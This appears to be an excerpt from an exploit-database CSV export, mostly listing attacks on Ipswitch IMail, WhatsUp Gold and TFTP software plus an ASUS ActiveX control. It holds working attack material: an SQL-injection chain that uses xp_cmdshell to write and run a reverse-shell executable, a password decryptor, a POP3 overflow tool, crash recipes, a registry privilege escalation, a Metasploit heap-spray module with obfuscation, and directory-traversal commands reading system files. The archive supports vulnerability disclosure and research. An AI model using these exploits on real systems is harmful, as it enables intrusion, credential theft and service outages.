getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0680 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0700 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 86 20 00 00 74 20 00 00 00 00 00 00 b0 20 00 00 be 20 00 00 a2 20 00 00 00 00 00 00 58 20 00 00 00 00 00 00 00 00 00 00 94 20 00 00 00 20 00 00 64 20 00 00 00 00 00 00 00 00 00 00 c8 20 00 00 0c 20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 86 20 00 00 74 20 00 00 00 00 00 00 b0 20 00 00 be 20 00 00 a2 20 00 00 00 00 00 00 4f 00 43 72 65 61 74 65 50 72 6f 63  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0780 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 65 73 73 41 00 00 9b 00 45 78 69 74 50 72 6f 63 65 73 73 00 6b 65 72 6e 65 6c 33 32 2e 64 6c 6c 00 00 41 00 57 53 41 53 6f 63 6b 65 74 41 00 00 43 00 57 53 41 53 74 61 72 74 75 70 00 00 56 00 63 6f 6e 6e 65 63 74 00 77 73 32 5f 33 32 2e 64 6c 6c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0800 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0880 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0900 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 63 6d 64 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0980 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0a00 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0a80 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0b00 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo r cx >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 0a00 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo w >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo q >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'debug<123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'copy 1.dll shell.exe';--"");
alert(""Debug - Triggering Reverse Shell"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'shell.exe';--"");
else
alert(""Victim Exploited - not running attack again"");"
2000-01-05,DoS,Windows,Ussr Labs,Ipswitch IMail 5.0.8/6.0/6.1,IMonitor 'status.cgi' Denial of Service,"source: https://www.securityfocus.com/bid/914/info
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/19711-1.exe
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/19711-2.zip","IMail includes a service called IMail Monitor which is used for local and remote performance measuring and diagnostics. It includes a small webserver operating on port 8181 to support web-based monitoring. One of the cgi scripts, status.cgi, is used to determine which services are currently running and create a web pafge to report this information. Multiple simultaneous requests for status.cgi will cause the software to crash, with a Dr. Watson error of ""Invalid Memory Address""."
1999-12-19,Local,Windows,Mike Davis,Ipswitch IMail Server 5.0/5.0.5/5.0.6/5.0.7/5.0.8/6.0,Weak Password Encryption,"// source: https://www.securityfocus.com/bid/880/info
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
/* Make the hash table we will need to refer to. */
/* Don't want to skip one! */
/* Make alphabet */
http://www.attrition.org
http://www.eEye.com
http://www.ussrback.com","IMail keeps the encrypted passwords for email accounts in a registry key, HKLM\SOFTWARE\Ipswitch\Imail\Domains\(DomainName)\Users\(UserName), in a string value called ""Password"". The encryption scheme used is weak and has been broken. The following description of the mechanism used is quoted from Matt Conover's post to Bugtraq, linked to in full in the Credits section.
ENCRYPTION SCHEME Take the lowercase of the account name, split it up by letter and convert each letter to its ASCII equivalent. Next, find the difference between each letter and the first letter. Take each letter of the password, find it's ASCII equivalent and add the offset (ASCII value of first char of the account name minus 97) then subtract the corresponding difference. Use the differences recursively if the password length is greater than the length of the account name. This gives you the character's new ASCII value. Next, Look it up the new ASCII value in the ASCII-ENCRYPTED table (see http://www.w00w00.org/imail_map.txt) and you now have the encrypted letter.
Example:
Account Name: mike
m = 109
i = 105
k = 107
e = 101
Differences:
First - First: 0
First - Second: 4
First - Third: 2
First - Fourth: 8
Unencrypted Password: rocks
r = 114
o = 111
c = 99
k = 107
s = 115
(ASCII value + offset) - difference:
offset: (109 - 97) = 12
(114 + 12) - 0 = 126
(111 + 12) - 4 = 119
(99 + 12) - 2 = 109
(107 + 12) - 8 = 111
(115 + 12) - 0 = 127
126 = DF
119 = D8
109 = CE
111 = D0
127 = E0
Encrypted Password: DFD8CED0E0
The decryption scheme is a little easier. First, like the encryption scheme, take the account name, split it up by letter and convert each letter to its ASCII equivalent. Next, find the difference between each letter and the first letter. Now split the encrypted password by two characters (e.g., EFDE = EF DE) then look up their ASCII equivalent within the ASCII-ENCRYPTED table (see http://www.w00w00.org/imail_map.txt). Take that ASCII value and add the corresponding difference.Look this value up in the ascii table. This table is made by taking the ASCII value of the first character of the account name and setting it equal to 'a'.
EXAMPLE
Account Name: mike
m = 109
i = 105
k = 107
e = 101
Differences:
First - First: 0
First - Second: 4
First - Third: 2
First - Fourth: 8
Encrypted Password: DFD8CED0E0
DF = 126
D8 = 119
CE = 109
D0 = 111
E0 = 127
Add Difference:
126 + 0 = 126
119 + 4 = 123
109 + 2 = 111
111 + 8 = 119
127 + 0 = 127
Look up in table (see http://www.w00w00.org/imail_map.txt):
126 = r
123 = o
111 = c
119 = k
127 = s
Unencrypted Password: rocks
* IMail password decryptor
* By: Mike Davis (mike@eEye.com)
* Thanks to Marc and Jason for testing and their general eliteness.
* Usage: imaildec <account name> <encrypted password>
void usage (char *);
int search (char *);
int eql (char *, char *);
int lc (int);
int strlen();
struct
char *string;
int o;
} hashtable[255];
struct { char *string; } encrypted[60];
char *list = ""0123456789ABCDEF"";
int alpha[95] = {
32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49,
50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67,
68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85,
86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102,
103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116,
117, 118, 119, 120, 121, 122, 123, 124, 125, 126
int
main (int argc, char *argv[])
int i, j, k, ascii, start, diffs[66], num, loop;
char asciic[155];
if (argc <= 2 || argc > 3) usage (argv[0]);
if (strlen (argv[2]) > 62)
printf (""\nERROR: Please enter an encrypted password less than 60 ""
""characters.\n\n"");
usage (argv[0]);
printf (""IMail password decryptor\nBy: Mike <Mike@eEye.com>\n\n"");
ascii = -97;
for (i = 0, start = 0; i < strlen (list); i++)
for (k = 0; k < strlen (list); k++)
hashtable[start].string = (char *) malloc (3);
sprintf (hashtable[start].string, ""%c%c"", list[i], list[k]);
hashtable[start].o = ascii++;
if ((k + 1) != strlen (list)) start++;
start++;
for (k = 0, start = 0; k < strlen (argv[1]); k += strlen (argv[1]))
for (j = k; j < k + strlen (argv[2]); j += 2, start++)
encrypted[start].string = (char *) malloc (3);
sprintf (encrypted[start].string, ""%c%c"", argv[2][j],
argv[2][j + 1]);
for (j = 0, start = 0; j < strlen(argv[2]) / strlen(argv[1]); j++)
for (i = 0; i < strlen (argv[1]); i++, start++)
diffs[start] = (lc(argv[1][0]) - lc(argv[1][i]));
printf (""Account Name: %s\n"", argv[1]);
printf (""Encrypted: "");
for (i = 0; i < strlen (argv[2]) / 2; i++) printf (""%s"", encrypted[i]);
putchar('\n');
printf (""Unencrypted: "");
for (i = 0, loop = 0; i < strlen (argv[2]) / 2; i++, loop++)
num = search (encrypted[i].string) + diffs[i];
if (loop == 0)
for (j = lc (argv[1][0]) - 65, start = 0;
j <= lc (argv[1][0]) + 29;
j++, start++)
asciic[j] = alpha[start];
putchar(asciic[num]);
putchar('\n');
return 0;
int
search (char *term)
register int n;
for (n = 0; n < 255; n++)
if (hashtable[n].string && eql (hashtable[n].string, term))
return hashtable[n].o;
return 0;
int
eql (char *first, char *second)
register int i;
for (i = 0; first[i] && (first[i] == second[i]); i++);
return (first[i] == second[i]);
int
lc (int letter)
if (letter >= 'A' && letter <= 'Z') return letter + 'a' - 'A';
else return letter;
void
usage (char *name)
printf (""IMail password decryptor\n"");
printf (""By: Mike (Mike@eEye.com)\n\n"");
printf (""Usage: %s <account name> <encrypted string>\n"", name);
printf (""E.g., %s crypto CCE5DFE5E2\n"", name);
exit (0);
Patch:
Ipswitch was notified of this advisory last week, and they have not
responded.  They released a never version afterwards, but we cannot
confirm whether or not this latest version, 6.01 fixes the vulnerability.
Their site says:
This patch fixes problems with POP server and IAdmin application,
including external database authentication problems and possible
password corruption problems.
Until we have positive confirmation, you can set an ACL on each registry
key containing the password to prevent normal users (while still allowing
IMail) from viewing other users' passwords.  You are safe to remove read
permissions on these registry keys--they will not affect IMail (as it
doesn't run with user privileges).
People that deserve hellos: eEye, USSR, and Interrupt
w00sites:"
1999-11-08,DoS,Windows,Interrupt,Ipswitch IMail 5.0.5/5.0.6/5.0.7,POP3 Denial of Service / Buffer Overflow (PoC),"source: https://www.securityfocus.com/bid/789/info
#include <stdio.h>
#include <string.h>
#ifdef WINDOWS
#include <windows.h>
#include <winsock.h>
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#endif
#ifndef WINDOWS
#define SOCKET_ERROR -1
#define closesocket(sock) close(sock)
#define WSACleanup() ;
#endif
#ifdef WINDOWS
#endif
#ifdef WINDOWS
#endif
/* Check to see if we get a +OK error code. If so then proceed. */","There is a buffer overflow in the username field when the username is between 200 and 500 characters. Although it may be possible to execute arbitrary code on the vulnerable server, current exploits only cause a denial of service on the remote machine.
Exploit (by Interrupt):
* IMAIL 5.07 POP3 Overflow
* By: Mike@eEye.com
* Demonstrates vulnerability
char overflow[] =
""USER AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""
""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""
""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""
""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""
""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA""
""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"";
int main(int argc, char *argv[])
WSADATA wsaData;
struct hostent *hp;
struct sockaddr_in sockin;
char buf[300], *check;
int sockfd, bytes;
char *hostname;
unsigned short port;
if (argc <= 1)
printf(""IMAIL POP3 Overflow\n"");
printf(""By: Mike@eEye.com\n\n"");
printf(""Usage: %s [hostname] [port]\n"", argv[0]);
printf(""If port is not specified we use '110'\n"");
exit(0);
hostname = argv[1];
if (argv[2]) port = atoi(argv[2]);
else port = atoi(""110"");
printf(""IMAIL POP3 Overflow\n"");
printf(""By: Mike@eEye.com\n\n"");
if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
fprintf(stderr, ""Error setting up with WinSock v1.1\n"");
exit(-1);
hp = gethostbyname(hostname);
if (hp == NULL)
printf(""ERROR: Uknown host %s\n"", hostname);
exit(-1);
sockin.sin_family = hp->h_addrtype;
sockin.sin_port = htons(port);
sockin.sin_addr = *((struct in_addr *)hp->h_addr);
if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
printf(""ERROR: Socket Error\n"");
exit(-1);
if ((connect(sockfd, (struct sockaddr *) &sockin,
sizeof(sockin))) == SOCKET_ERROR)
printf(""ERROR: Connect Error\n"");
closesocket(sockfd);
WSACleanup();
exit(-1);
printf(""Connected to [%s] on port [%d], sending overflow....\n"",
hostname, port);
if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
printf(""ERROR: Recv Error\n"");
closesocket(sockfd);
WSACleanup();
exit(1);
buf[bytes] = '\0';
check = strstr(buf, ""+OK"");
if (check == NULL)
printf(""ERROR: NO +OK response from inital connect\n"");
closesocket(sockfd);
WSACleanup();
exit(-1);
if (send(sockfd, overflow, strlen(overflow),0) == SOCKET_ERROR)
printf(""ERROR: Send Error\n"");
closesocket(sockfd);
WSACleanup();
exit(-1);
printf(""Sent.\n"");
closesocket(sockfd);
WSACleanup();"
1999-03-01,DoS,Multiple,Marc of eEye,Ipswitch IMail 5.0,Whois32 Daemon Buffer Overflow (Denial of Service) (PoC),source: https://www.securityfocus.com/bid/506/info,"IMail's whois server can be crashed due to an unchecked buffer.
Telnet to target machine, port 43
Send glob1
Where glob1 is 1000 characters."
1999-03-01,DoS,Multiple,Marc of eEye,Ipswitch IMail 5.0/6.0,Web Service Buffer Overflow (Denial of Service) (PoC),"source: https://www.securityfocus.com/bid/505/info
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/19380.zip","The IMail web server can be crashed by requesting an abnormally long URL.
Telnet to target machine, port 8383
Send: GET /glob1/
Where glob1 is 3000 characters.
Marc Maiffret <marc@eeye.com> has released the following exploit:"
1999-03-01,DoS,Multiple,Marc of eEye,Ipswitch IMail 5.0,IMonitor Buffer Overflow (Denial of Service) (PoC),source: https://www.securityfocus.com/bid/504/info,"The IMail IMonitor service can be crashed by exploiting a buffer overflow vulnerability.
Telnet to target machine, port 8181
Send: glob1
hit enter twice
Where glob1 is 2045 characters."
1999-03-01,DoS,Multiple,Marc of eEye,Ipswitch IMail 5.0,LDAP Buffer Overflow (Denial of Service) (PoC),source: https://www.securityfocus.com/bid/503/info,"The IMail ldap service has an unchecked buffer, resulting in a classic buffer overflow vulnerability. While it does not crash the service, it drives CPU utilization up rendering the system essentially unusable.
Telnet to target machine, port 389
Send: Y glob1
hit enter twice
Server Returns: 0
Send: Y glob2
hit enter
Where glob1 and glob2 are 2375 characters and Y is Y. The ldap service goes to 90 percent or so and idles there. Therefore using up most system resources."
1999-03-01,DoS,Multiple,Marc of eEye,Ipswitch IMail 5.0,Imapd Buffer Overflow (Denial of Service) (PoC),source: https://www.securityfocus.com/bid/502/info,"The imapd login process is susceptible to a buffer overflow attack which will crash the service.
Telnet to target machine, port 143
* OK IMAP4 Server (IMail 4.06)
X LOGIN glob1 glob2
Where glob1 is 1200 characters and glob2 is 1300 characters."
1999-02-04,Local,Windows,Marc,Ipswitch IMail 5.0 / Ipswitch WS_FTP Server 1.0.1/1.0.2,Local Privilege Escalation,source: https://www.securityfocus.com/bid/218/info,"Non-administrative Imail and WS_FTP Server users may elevate their privileges to administrator for these applications by modifying a specific registry value. Once a person has obtained administrative privileges, they may use the application interface (locally) to read email, create accounts, delete accounts, etc.
Access the following registry key ""HKEY_LOCAL_MACHINE\SOFTWARE\Ipswitch\IMail\Domains\Machine_name\Users\Username""
Modify the Flag value to read ""1920"". 1920 gives the user account administrator permissions to IMail and WS_FTP Server."
2012-02-29,Remote,Windows,Metasploit,ASUS Net4Switch,'ipswcom.dll' ActiveX Stack Buffer Overflow (Metasploit),"# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
#{spray}
#obfuscate on demand
#{js}
http://www.softpedia.com/progDownload/ASUS-Net4Switch-Download-203619.html","require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = NormalRanking
include Msf::Exploit::Remote::HttpServer::HTML
def initialize(info={})
super(update_info(info,
'Name'           => ""ASUS Net4Switch ipswcom.dll ActiveX Stack Buffer Overflow"",
'Description'    => %q{
This module exploits a vulnerability found in ASUS Net4Switch's ipswcom.dll
ActiveX control.  A buffer overflow condition is possible in multiple places all
because of the poor use of the CxDbgPrint() function, which allows remote attackers
to gain arbitrary code execution under the context of the user.
'License'        => MSF_LICENSE,
'Author'         =>
'Dmitriy Evdokimov', #Initial discovery, poc
'sinn3r'             #Metasploit
'References'     =>
[ 'OSVDB', 'http://osvdb.org/show/osvdb/79438' ],
[ 'URL', 'http://dsecrg.com/pages/vul/show.php?id=417' ]
'Payload'        =>
'BadChars'        => ""\x00"",
'StackAdjustment' => -3500,
'DefaultOptions'  =>
'ExitFunction'         => ""seh"",
'InitialAutoRunScript' => 'migrate -f',
'Platform'       => 'win',
'Targets'        =>
[ 'Automatic', {} ],
[ 'IE 6 on Windows XP SP3', { 'Max' => '0x40000', 'Offset' => '0x500' } ],
[ 'IE 7 on Windows XP SP3', { 'Max' => '0x40000', 'Offset' => '0x500' } ]
'Privileged'     => false,
'DisclosureDate' => ""Feb 17 2012"",
'DefaultTarget'  => 0))
register_options(
OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])
], self.class)
end
def get_target(agent)
return target if target.name != 'Automatic'
if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
return targets[1]  #IE 6 on Windows XP SP3
elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
return targets[2]  #IE 7 on Windows XP SP3
else
return nil
end
end
def on_request_uri(cli, request)
agent = request.headers['User-Agent']
my_target = get_target(agent)
if my_target.nil?
print_error(""Browser not supported: #{agent.to_s}: #{cli.peerhost}:#{cli.peerport}"")
send_not_found(cli)
return
end
p = payload.encoded
js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
nops = Rex::Text.to_unescape(make_nops(4))
spray = <<-JS
var heap_obj = new heapLib.ie(0x20000);
var code = unescape(""#{js_code}"");
var nops = unescape(""#{nops}"");
while (nops.length < 0x80000) nops += nops;
var offset = nops.substring(0, #{my_target['Offset']});
var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
while (shellcode.length < 0x40000) shellcode += shellcode;
var block = shellcode.substring(0, (0x80000-6)/2);
heap_obj.gc();
for (var i=1; i < 0x300; i++) {
heap_obj.alloc(block);
JS
spray = heaplib(spray, {:noobfu => true})
js = <<-JS
var obj = new ActiveXObject(""ipswcom.IPSWComItf"");
function generate_padding(d, s) {
var tmp = d;
while (tmp.length < s) {
tmp += tmp;
var buf = tmp.substring(0, s/2);
tmp = null;
return buf;
var arg1 = generate_padding(unescape(""%u4141""), 4);
var arg2 = ""A""; // Expands to 0x0041, helps us to align the stack
arg2 += generate_padding(unescape(""%u4343""), 2680);
arg2 += unescape(""%u4242%u4242"");
arg2 += unescape(""%u0d0d%u0d0d"");
arg2 += generate_padding(unescape(""%u0d0d""), #{my_target['Max']}-arg2.length);
obj.MsgBox(arg1, arg2, 2);
JS
if datastore['OBFUSCATE']
js = ::Rex::Exploitation::JSObfu.new(js)
js.obfuscate
end
html = <<-EOS
<html>
<head>
</head>
<body>
<script>
</script>
</body>
</html>
EOS
html = html.gsub(/\t\t/, '')
print_status(""Sending html to #{cli.peerhost}:#{cli.peerport}..."")
send_response(cli, html, {'Content-Type'=>'text/html'})
end
end
=begin
Download:
clsid:1B9E86D8-7CAF-46C8-9938-569B21E17A8E
C:\Program Files\ASUS\Net4Switch\ipswcom.dll
.text:10030523                 push    ecx
.text:10030524                 mov     eax, [ebp+arg_C]
.text:10030527                 mov     [ebp+var_4], eax
.text:1003052A                 cmp     [ebp+var_4], 0
.text:1003052E                 jz      short loc_10030541  <-- uType 10h
.text:10030530                 cmp     [ebp+var_4], 1
.text:10030534                 jz      short loc_10030573  <-- uType 44h
.text:10030536                 cmp     [ebp+var_4], 2
.text:1003053A                 jz      short loc_100305A5  <-- CxDbgPrint
.text:100305A5 loc_100305A5:                           ; CODE XREF: MsgBox+1Aj
.text:100305A5                 mov     eax, [ebp+lpText]
.text:100305A8                 push    eax
.text:100305A9                 push    offset aIpsw_alertS ; ""[IPSW_alert] = %s""
.text:100305AE                 push    0FFh
.text:100305B3                 call    ds:CxDbgPrint
=end"
2011-12-02,Remote,Windows,SecPod Research,Ipswitch TFTP Server 1.0.0.24,Directory Traversal,"# Title     : Ipswitch TFTP Server Directory Traversal Vulnerability
# Author    : Prabhu S Angadi from SecPod Technologies (www.secpod.com)
# Vendor    : http://www.whatsupgold.com/index.aspx
# Advisory  : http://secpod.org/blog/?p=424
#             http://secpod.org/advisories/SecPod_Ipswitch_TFTP_Server_Dir_Trav.txt
#             http://secpod.org/exploits/SecPod_Ipswitch_TFTP_Server_Dir_Trav_POC.py
# Version   : Ipswitch TFTP Server 1.0.0.24
# Date      : 02/12/2011
http://www.ipswitch.com/
http://secpod.org/blog/?p=424
http://www.whatsupgold.com/index.aspx
http://secpod.org/advisories/SecPod_Ipswitch_TFTP_Server_Dir_Trav.txt
http://secpod.org/exploits/SecPod_Ipswitch_TFTP_Server_Dir_Trav_POC.py
http://www.whatsupgold.com/free-software/network-tools/tftp-server.aspx
## netascii","SecPod ID: 102813/09/2011 Issue Discovered
04/10/2011 Vendor Notified
No Response from Vendor
02/12/2011 Advisory Released
Class: Information Disclosure                   Severity: Medium
Overview:
Ipswitch TFTP Server 1.0.0.24 is prone to a directory traversal
vulnerability.
Technical Description:
The vulnerability is caused due to improper validation to Read Request
containing '../' sequences, which allows attackers to read arbitrary
files.
Impact:
Successful exploitation could allow an attacker to obtain sensitive
information.
Affected Software:
Ipswitch TFTP Server 1.0.0.24
Tested on:
Ipswitch TFTP Server 1.0.0.24 on Windows XP SP3 & Windows 7.
References:
Download Link:
Proof of Concept:
tftp> get ../../../../../../../../../../../boot.ini
tftp> get ../../../../../../../../../../../windows/win.ini
Solution:
Not available
Risk Factor:
CVSS Score Report:
ACCESS_VECTOR          = NETWORK
ACCESS_COMPLEXITY      = LOW
